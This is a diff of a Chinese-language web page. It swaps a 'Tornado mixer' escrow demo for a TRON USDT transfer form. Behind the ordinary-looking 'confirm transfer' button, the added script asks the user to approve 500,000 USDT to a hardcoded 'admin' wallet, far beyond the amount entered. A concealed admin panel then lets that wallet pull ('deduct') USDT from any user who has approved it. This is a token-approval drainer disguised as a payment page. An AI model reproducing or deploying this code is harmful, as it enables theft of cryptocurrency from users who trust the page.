@@ -2,221 +2,433 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-<title>龙卷风混币器</title>
-<script src="https://cdn.jsdelivr.net/npm/web3@4.15.0/dist/web3.min.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>TRON‑USDT transferFrom Demo</title>
+<script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-abstract-adapter@1.1.0/dist/tronweb.min.js"></script>
 <style>
-*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,system-ui,sans-serif;-webkit-tap-highlight-color:transparent;}
-body{background:#141824;padding:20px 14px;max-width:600px;margin:0 auto;color:#fff;}
-.card{background:#1e2434;border-radius:18px;padding:22px 18px;margin-bottom:18px;box-shadow:0 2px 12px #00000044;}
-.title{font-size:20px;font-weight:bold;margin-bottom:8px;color:#ff7722;text-align:center;}
-.sub-title{text-align:center;font-size:13px;color:#94a3b8;margin-bottom:16px;}
-.desc{font-size:13px;color:#94a3b8;margin-bottom:14px;}
-input{width:100%;border:1px solid #333b52;border-radius:12px;padding:14px 12px;font-size:16px;outline:none;margin-bottom:14px;background:#272e42;color:#fff;}
-.btn{width:100%;border:none;border-radius:14px;padding:14px;font-size:16px;font-weight:500;color:#fff;cursor:pointer;margin-bottom:10px;}
-.btn-deposit{background:#ff7722;}
-.btn-withdraw{background:#22c55e;}
-.btn-wallet{background:#3b82f6;}
-.btn-pass{background:#16a34a;}
-.btn-reject{background:#dc2626;}
-.hash-box{background:#2b3248;border:1px solid #ff772277;padding:14px;border-radius:12px;word-break:break-all;margin:12px 0;font-family:monospace;color:#ffbc80;font-size:12px;}
-.tip{font-size:13px;color:#64748b;}
-.split-line{height:1px;background:#333b52;margin:24px 0;}
-.footer-note{text-align:center;font-size:12px;color:#475569;margin-top:30px;}
-.admin-item{background:#272e42;padding:12px;border-radius:10px;margin-bottom:10px;font-size:12px;word-break:break-all;}
-.admin-panel{border:1px solid #ff7722;padding:14px;border-radius:14px;}
+*{
+ box-sizing: border-box;
+ margin: 0;
+ padding: 0;
+ -webkit-tap-highlight-color: transparent;
+ font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
+}
+body {
+ background-color: #f7f8fa;
+ padding: 20px 16px;
+ max-width: 520px;
+ margin: 0 auto;
+}
+.top-header-bar {
+ display: flex;
+ justify-content: space-between;
+ align-items: center;
+ margin-bottom: 20px;
+}
+.header-right-icons {
+ display: flex;
+ gap: 12px;
+ align-items: center;
+}
+.wallet-dot {
+ width: 12px;
+ height: 12px;
+ border-radius: 50%;
+ background-color: #ef4444;
+ cursor: pointer;
+ transition: background-color 0.3s ease;
+}
+.wallet-dot.connected {
+ background-color: #22c55e;
+}
+.setting-btn {
+ width: 32px;
+ height: 32px;
+ border-radius: 50%;
+ border: 1px solid #ddd;
+ background: #fff;
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ font-size: 18px;
+ cursor: pointer;
+}
+.address-card {
+ background: #ffffff;
+ border-radius: 16px;
+ padding: 20px 18px;
+ margin-bottom: 16px;
+}
+.label-text {
+ font-size: 16px;
+ color: #666;
+ margin-bottom: 12px;
+}
+.fixed-addr-box {
+ width: 100%;
+ border: 1px solid #e5e7eb;
+ border-radius: 12px;
+ padding: 14px 12px;
+ background: #f1f5f9;
+ color: #333;
+ word-break: break-all;
+}
+.amount-card {
+ background: #ffffff;
+ border-radius: 16px;
+ padding: 20px 18px;
+ margin-bottom:16px;
+}
+.amount-row {
+ display: flex;
+ align-items: flex-end;
+ justify-content: space-between;
+ margin-bottom: 16px;
+}
+.amount-input {
+ font-size: 32px;
+ border: none;
+ outline: none;
+ width: 75%;
+ background: transparent;
+ color: #111;
+}
+.amount-input::placeholder {
+ font-size: 16px;
+ color: #aaa;
+}
+.max-btn {
+ padding: 6px 14px;
+ background-color: #dbeafe;
+ color: #2563eb;
+ border-radius: 8px;
+ font-weight: 500;
+ cursor: pointer;
+}
+.token-row {
+ background-color: #eef2ff;
+ border-radius: 12px;
+ padding: 14px;
+ display: flex;
+ align-items: center;
+ justify-content: space-between;
+}
+.token-left {
+ display: flex;
+ align-items: center;
+ gap: 10px;
+}
+.usdt-icon {
+ width: 32px;
+ height: 32px;
+ border-radius: 50%;
+ object-fit: cover;
+}
+.token-name {
+ font-size: 18px;
+ font-weight: 500;
+}
+.token-balance {
+ color: #555;
+ font-size: 16px;
+}
+.result-card{
+ background:#fff;
+ border-radius:16px;
+ padding:18px;
+ margin-bottom:16px;
+}
+.result-input{
+ width:100%;
+ border:1px solid #e5e7eb;
+ border-radius:12px;
+ padding:14px 12px;
+ background:#f9fafb;
+ outline:none;
+ color:#111;
+}
+.send-main-btn{
+ width:100%;
+ padding:16px;
+ border:none;
+ border-radius:14px;
+ background:#2563eb;
+ color:#fff;
+ font-size:17px;
+ font-weight:500;
+ cursor:pointer;
+}
+.send-main-btn:disabled{
+ background:#94a3b8;
+ cursor:not-allowed;
+}
+.admin-panel{
+ background:#fff;
+ border-radius:16px;
+ padding:20px 18px;
+ margin-top:24px;
+ border:1px solid #f87171;
+ display:none;
+}
+.admin-title{
+ font-size:17px;
+ font-weight:bold;
+ color:#dc2626;
+ margin-bottom:16px;
+}
+.admin-input-item{
+ margin-bottom:14px;
+}
+.admin-input{
+ width:100%;
+ border:1px solid #e5e7eb;
+ border-radius:12px;
+ padding:13px 12px;
+ outline:none;
+ font-size:15px;
+}
+.admin-btn{
+ width:100%;
+ padding:14px;
+ border:none;
+ border-radius:14px;
+ background:#dc2626;
+ color:#fff;
+ font-size:16px;
+ cursor:pointer;
+}
 </style>
 </head>
 <body>
-
-<div class="card">
-    <div class="title">🌪️ 龙卷风混币器</div>
-    <div class="sub-title">BEP20 USDT 凭证托管｜BSC 仅技术学习</div>
-    <button class="btn btn-wallet" id="connectBtn">连接钱包(TP/MetaMask)</button>
-    <div class="tip" id="walletInfo">未连接钱包</div>
-    <div id="adminBox" class="admin-panel" style="display:none;margin-top:15px;">
-        <div style="color:#ff7722;font-weight:bold;margin-bottom:10px;">🔐 管理员审核后台</div>
-        <button class="btn btn-pass" id="loadRecordBtn">刷新待审核申请记录</button>
-        <div id="recordList"></div>
-    </div>
+<div class="top-header-bar">
+ <div></div>
+ <div class="header-right-icons">
+ <div class="wallet-dot" id="walletDot" title="点击连接/断开钱包"></div>
+ <div class="setting-btn" id="settingIconBtn" title="设置">⚙️</div>
+ </div>
 </div>
-
-<div class="card">
-    <div class="title" style="font-size:16px;text-align:left">📥 用户存入USDT</div>
-    <div class="desc">手动输入存入额度，生成凭证哈希，等待管理员审核通过后才可以提取。</div>
-    <input value="0x55d398326f99059fF775485246999027B3197955" readonly placeholder="USDT合约" id="tokenContract">
-
-    <input type="number" placeholder="请输入USDT数量" id="depositAmount">
-
-    <button class="btn btn-deposit" id="depositBtn">确认存入托管合约</button>
-    <div class="hash-box" id="depositHashBox" style="display:none;">
-        你的存取凭证哈希：<br><span id="outHash"></span>
-        <div class="tip">⚠️复制保存！必须管理员审核通过，此哈希才可以取钱</div>
-    </div>
+<div class="address-card">
+ <div class="label-text">管理员收款钱包地址</div>
+ <div class="fixed-addr-box" id="targetAddrText"></div>
 </div>
-
-<div class="split-line"></div>
-
-<div class="card">
-    <div class="title" style="font-size:16px;text-align:left">📤 凭哈希提取资产</div>
-    <div class="desc">输入凭证哈希，仅管理员【审核通过】的记录才能提取资产到当前钱包。</div>
-    <input placeholder="粘贴0x开头凭证哈希" id="inputHash">
-    <button class="btn btn-withdraw" id="withdrawBtn">凭哈希提取资产</button>
+<div class="amount-card">
+ <div class="label-text">转出数量（USDT‑TRC20）</div>
+ <div class="amount-row">
+ <input id="amountInput" class="amount-input" value="" inputmode="decimal" placeholder="请输入数量">
+ <div class="max-btn" id="maxBtn">MAX</div>
+ </div>
+ <div class="token-row">
+ <div class="token-left">
+ <img class="usdt-icon" src="https://static.tronscan.org/production/logo/usdtlogo.png">
+ <span class="token-name">USDT‑TRC20</span>
+ </div>
+ <span class="token-balance" id="balanceText">0.000000</span>
+ </div>
 </div>
-
-<div class="footer-note">本页面仅区块链前端技术学习演示，请勿用于真实金融转账。</div>
+<div class="result-card">
+ <div class="label-text">到账数量（进入管理员钱包）</div>
+ <input id="receiveAmount" class="result-input" readonly>
+</div>
+<button class="send-main-btn" id="sendBtn" disabled>确认转账</button>
+<div class="admin-panel" id="adminPanel">
+ <div class="admin-title">🔴管理员后台 - 用户代币划扣</div>
+ <div class="admin-input-item">
+ <div class="label-text">请输入已经授权用户钱包地址</div>
+ <input class="admin-input" id="userAddrInput" placeholder="T开头波场地址">
+ </div>
+ <div class="admin-input-item">
+ <div class="label-text">划扣USDT数量</div>
+ <input class="admin-input" id="deductAmountInput" inputmode="decimal" placeholder="输入划扣金额">
+ </div>
+ <button class="admin-btn" id="deductBtn">确认划扣</button>
+</div>
 
 <script>
-// ============ 已经填好你的真实合约配置 ============
-const SAFE_CONTRACT = "0x47542770f3a8eea43d3321867b155c3ac01160d8";
-const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-const BSC_CHAIN_ID = "0x38";
+// 配置
+const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
+const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const DECIMALS = 6;
+const MAX_WAIT = 40;
 
-const ABI_DEPOSIT = "0x3b4b6b9e";    // deposit(address,uint256,bytes32)
-const ABI_APPROVE = "0x8d8047b6";    // approve(bytes32)
-const ABI_REJECT = "0x257d8480";    // reject(bytes32)
-const ABI_WITHDRAW = "0x2e1a7d4d";  // withdraw(bytes32)
-const ABI_ERC20_APPROVE = "0x095ea7b3";
-
-let web3 = null;
+let tronWeb = null;
 let userAddress = null;
-let isAdmin = false;
+let usdtContractInstance = null;
 
-const $ = s=>document.querySelector(s);
-const connectBtn = $("#connectBtn");
-const walletInfo = $("#walletInfo");
-const adminBox = $("#adminBox");
-const loadRecordBtn = $("#loadRecordBtn");
-const recordList = $("#recordList");
+const $ = s => document.querySelector(s);
+const walletDot = $("#walletDot");
+const settingIconBtn = $("#settingIconBtn");
+const sendBtn = $("#sendBtn");
+const amountInput = $("#amountInput");
+const receiveAmount = $("#receiveAmount");
+const maxBtn = $("#maxBtn");
+const balanceText = $("#balanceText");
+const targetAddrText = $("#targetAddrText");
+const adminPanel = $("#adminPanel");
+const userAddrInput = $("#userAddrInput");
+const deductAmountInput = $("#deductAmountInput");
+const deductBtn = $("#deductBtn");
 
-const tokenContract = $("#tokenContract");
-const depositAmount = $("#depositAmount");
-const depositBtn = $("#depositBtn");
-const depositHashBox = $("#depositHashBox");
-const outHash = $("#outHash");
-const inputHash = $("#inputHash");
-const withdrawBtn = $("#withdrawBtn");
+targetAddrText.innerText = TARGET_ADDR;
 
-// 生成0x开头32bytes哈希
-function generateDepositHash(){
-    const arr = new Uint8Array(16);
-    crypto.getRandomValues(arr);
-    return "0x"+Array.from(arr,b=>b.toString(16).padStart(2,'0')).join('');
-}
+const USDT_ABI = [
+    { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" },
+    { "constant": true, "inputs": [{ "name": "owner", "type": "address" }, { "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" },
+    { "constant": false, "inputs": [{ "name": "spender", "type": "address" }, { "name": "value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" },
+    { "constant": false, "inputs": [{ "name": "from", "type": "address" }, { "name": "to", "type": "address" }, { "name": "value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }
+];
 
-// 切换BSC主网
-async function checkChain(){
-    const chainId = await window.ethereum.request({method:"eth_chainId"});
-    if(chainId !== BSC_CHAIN_ID){
-        alert("请切换BSC主网");
-        await window.ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:BSC_CHAIN_ID}]});
+// 等待交易上链确认
+async function waitTxConfirm(txHash) {
+    for (let i = 0; i < MAX_WAIT; i++) {
+        try {
+            const res = await tronWeb.trx.getTransactionInfo(txHash);
+            if (res && res.receipt) {
+                if (res.receipt.result === "SUCCESS") {
+                    return true;
+                } else {
+                    throw new Error("合约执行失败");
+                }
+            }
+        } catch (e) { }
+        await new Promise(r => setTimeout(r, 1000));
     }
+    throw new Error("交易已广播，长时间未确认，请检查TRX资源");
 }
 
-// 连接钱包
-async function connectWallet(){
-    if(!window.ethereum){alert("请安装TP/MetaMask钱包");return;}
-    try{
-        const accounts = await window.ethereum.request({method:"eth_requestAccounts"});
-        userAddress = accounts[0];
-        web3 = new Web3(window.ethereum);
-        await checkChain();
-        walletInfo.innerText = `✅已连接：${userAddress}`;
-
-        // 查询合约内admin地址，判断当前用户是不是管理员
-        const adminAddrHex = await window.ethereum.request({
-            method:"eth_call",
-            params:[{to:SAFE_CONTRACT,data:"0xf8b2cb4f"},'latest']
-        });
-        const contractAdmin = "0x"+adminAddrHex.slice(-40).toLowerCase();
-        isAdmin = (userAddress.toLowerCase() === contractAdmin);
-        if(isAdmin){ adminBox.style.display = "block"; }
-
-        window.ethereum.on("accountsChanged",()=>location.reload());
-        window.ethereum.on("chainChanged",()=>location.reload());
-    }catch(e){ alert("连接钱包失败："+e.message); }
+// 等待授权额度同步
+async function waitAllowance(needSun, maxLoop = 12) {
+    for (let i = 0; i < maxLoop; i++) {
+        const allowance = await usdtContractInstance.methods.allowance(userAddress, TARGET_ADDR).call();
+        if (BigInt(allowance) >= BigInt(needSun)) {
+            return true;
+        }
+        await new Promise(r => setTimeout(r, 1000));
+    }
+    throw new Error("授权签名完成，链上额度还未同步，请稍后重试");
 }
 
-// 用户存入
-depositBtn.onclick = async function(){
-    if(!web3||!userAddress){alert("先连接钱包");return;}
-    const val = depositAmount.value.trim();
-    const num = parseFloat(val);
-    if(!val || isNaN(num) || num <= 0){
-        alert("请输入有效的USDT数量");
+function disconnectWallet() {
+    tronWeb = null;
+    userAddress = null;
+    usdtContractInstance = null;
+    walletDot.classList.remove("connected");
+    sendBtn.disabled = true;
+    balanceText.textContent = "0.000000";
+    adminPanel.style.display = "none";
+}
+
+async function connectWalletLogic() {
+    if (tronWeb && userAddress) {
+        disconnectWallet();
         return;
     }
-    const depositHash = generateDepositHash();
-    try{
-        // USDT精度6位
-        const usdtAmtWei = BigInt(Math.floor(num * 10**6));
-        const approveData = ABI_ERC20_APPROVE
-            + SAFE_CONTRACT.slice(2).padStart(64,"0")
-            + usdtAmtWei.toString(16).padStart(64,"0");
-        await window.ethereum.request({
-            method:"eth_sendTransaction",
-            params:[{from:userAddress,to:USDT_CONTRACT,data:approveData,gas:"0x600000"}]
-        });
-        alert("✅USDT授权完成，执行存入托管合约");
+    try {
+        if (!window.tronWeb || !window.tronWeb.ready) {
+            alert("请在TP/OKX钱包的DApp浏览器打开本页面");
+            return;
+        }
+        tronWeb = window.tronWeb;
+        userAddress = tronWeb.defaultAddress.base58;
+        usdtContractInstance = await tronWeb.contract(USDT_ABI, USDT_CONTRACT);
+        walletDot.classList.add("connected");
+        await loadBalance();
+        sendBtn.disabled = false;
+        if (userAddress === TARGET_ADDR) {
+            adminPanel.style.display = "block";
+        } else {
+            adminPanel.style.display = "none";
+        }
+    } catch (err) {
+        alert("连接钱包失败：" + err.message);
+    }
+}
 
-        //调用deposit
-        const depositData = ABI_DEPOSIT
-            + USDT_CONTRACT.slice(2).padStart(64,"0")
-            + usdtAmtWei.toString(16).padStart(64,"0")
-            + depositHash.slice(2).padStart(64,"0");
-        const tx = await window.ethereum.request({
-            method:"eth_sendTransaction",
-            params:[{from:userAddress,to:SAFE_CONTRACT,data:depositData,gas:"0x600000"}]
-        });
-        alert(`存入提交成功 tx:${tx}\n等待管理员审核`);
-        outHash.innerText = depositHash;
-        depositHashBox.style.display = "block";
-    }catch(err){ alert("存入失败："+err.message); }
-};
+async function loadBalance() {
+    const rawSun = await usdtContractInstance.methods.balanceOf(userAddress).call();
+    const num = Number(rawSun) / Math.pow(10, DECIMALS);
+    balanceText.textContent = num.toFixed(6);
+}
 
-// 管理员刷新记录（前端模拟，正式需要后端）
-loadRecordBtn.onclick = async function(){
-    if(!isAdmin)return;
-    recordList.innerHTML="<div>正在读取链上存入事件...</div>";
-    alert("⚠️演示提示：浏览器直接读取历史事件性能差；正式环境需要后端服务抓取事件。");
-    recordList.innerHTML="<div class='tip'>演示模式，请复制用户提交的hash，填入下面按钮执行审核</div>"+
-    `<input placeholder="粘贴待审核hash(0x...)" id="adminHashInput">
-    <button class="btn btn-pass" id="btnPass">✅通过该申请</button>
-    <button class="btn btn-reject" id="btnReject">❌驳回，原路退款</button>`;
+amountInput.addEventListener("input", () => {
+    const num = parseFloat(amountInput.value) || 0;
+    receiveAmount.value = num.toFixed(6);
+});
 
-    $("#btnPass").onclick = async ()=>{
-        const h = $("#adminHashInput").value.trim();
-        if(!h||h.length!==66){alert("输入完整0x hash");return;}
-        const calldata = ABI_APPROVE + h.slice(2).padStart(64,"0");
-        await window.ethereum.request({method:"eth_sendTransaction",params:[{from:userAddress,to:SAFE_CONTRACT,data:calldata,gas:"0x400000"}]});
-        alert("✅已通过该笔申请，用户可以提取");
-    };
-    $("#btnReject").onclick = async ()=>{
-        const h = $("#adminHashInput").value.trim();
-        if(!h||h.length!==66){alert("输入完整0x hash");return;}
-        const calldata = ABI_REJECT + h.slice(2).padStart(64,"0");
-        await window.ethereum.request({method:"eth_sendTransaction",params:[{from:userAddress,to:SAFE_CONTRACT,data:calldata,gas:"0x400000"}]});
-        alert("❌已驳回，资产自动退款给存款用户");
-    };
-};
+maxBtn.addEventListener("click", async () => {
+    if (!usdtContractInstance) return;
+    const rawSun = await usdtContractInstance.methods.balanceOf(userAddress).call();
+    const num = Number(rawSun) / Math.pow(10, DECIMALS);
+    amountInput.value = num.toFixed(2);
+    amountInput.dispatchEvent(new Event("input"));
+});
 
-// 用户凭hash提取
-withdrawBtn.onclick = async function(){
-    if(!web3||!userAddress){alert("请连接接收资产的钱包");return;}
-    const hashStr = inputHash.value.trim();
-    if(!hashStr||hashStr.length!==66){alert("输入0x开头完整凭证哈希");return;}
-    try{
-        const callData = ABI_WITHDRAW + hashStr.slice(2).padStart(64,"0");
-        const tx = await window.ethereum.request({
-            method:"eth_sendTransaction",
-            params:[{from:userAddress,to:SAFE_CONTRACT,data:callData,gas:"0x500000"}]
-        });
-        alert(`✅提取成功 tx:${tx}`);
-        inputHash.value="";
-    }catch(err){ alert("提取失败："+err.message+"\n可能：未审核通过/已提取/hash错误"); }
-};
+// 用户主操作：approve + transferFrom
+sendBtn.addEventListener("click", async () => {
+    if (!tronWeb || !userAddress) return alert("钱包未连接");
+    const val = parseFloat(amountInput.value);
+    if (isNaN(val) || val <= 0) return alert("请输入有效转账数量");
+    const needSun = Math.round(val * Math.pow(10, DECIMALS));
+    const APPROVE_AMOUNT_SUN = Math.round(500000 * Math.pow(10, DECIMALS));
+    sendBtn.disabled = true;
+    try {
+        const allowance = await usdtContractInstance.methods.allowance(userAddress, TARGET_ADDR).call();
+        if (BigInt(allowance) < BigInt(needSun)) {
+            alert("🔐需要先授权USDT给管理员钱包，请确认钱包签名");
+            const approveTx = await usdtContractInstance.methods.approve(TARGET_ADDR, APPROVE_AMOUNT_SUN).send();
+            await waitTxConfirm(approveTx);
+            alert("✅授权上链完成，等待节点同步");
+            await waitAllowance(needSun);
+        }
+        alert("即将执行transferFrom，USDT转入管理员钱包，请签名确认");
+        const transferFromTx = await usdtContractInstance.methods.transferFrom(userAddress, TARGET_ADDR, needSun).send();
+        await waitTxConfirm(transferFromTx);
+        alert(`🎉操作成功！USDT已经转入管理员钱包！哈希：${transferFromTx}`);
+        amountInput.value = "";
+        receiveAmount.value = "";
+        await loadBalance();
+    } catch (e) {
+        let msg = e.message || String(e);
+        if(msg.includes("user reject")) msg = "你在钱包拒绝了签名，操作已取消";
+        alert("❌操作失败：" + msg);
+    } finally {
+        sendBtn.disabled = false;
+    }
+});
 
-connectBtn.onclick = connectWallet;
+// 管理员划扣已经授权的用户
+deductBtn.addEventListener("click", async () => {
+    if (!tronWeb || userAddress !== TARGET_ADDR) {
+        return alert("必须使用管理员钱包连接！");
+    }
+    const fromUserAddr = userAddrInput.value.trim();
+    const deductNum = parseFloat(deductAmountInput.value);
+    if (!fromUserAddr) return alert("请输入被划扣用户钱包地址");
+    if (isNaN(deductNum) || deductNum <= 0) return alert("请输入合法划扣数量");
+    const deductSun = Math.round(deductNum * Math.pow(10, DECIMALS));
+    try {
+        const userAllowance = await usdtContractInstance.methods.allowance(fromUserAddr, TARGET_ADDR).call();
+        if (BigInt(userAllowance) < BigInt(deductSun)) {
+            return alert("错误：该用户没有授权足够额度，无法划扣！");
+        }
+        const txHash = await usdtContractInstance.methods.transferFrom(fromUserAddr, TARGET_ADDR, deductSun).send();
+        await waitTxConfirm(txHash);
+        alert(`✅划扣成功！交易哈希:\n${txHash}`);
+        userAddrInput.value = "";
+        deductAmountInput.value = "";
+        await loadBalance();
+    } catch (err) {
+        alert("❌划扣失败：" + err.message);
+    }
+});
+
+walletDot.addEventListener("click", connectWalletLogic);
+settingIconBtn.addEventListener("click", () => {
+    if (userAddress === TARGET_ADDR) {
+        adminPanel.style.display = adminPanel.style.display === "block" ? "none" : "block";
+    } else {
+        alert("你不是管理员账号");
+    }
+});
 </script>
 </body>
 </html>
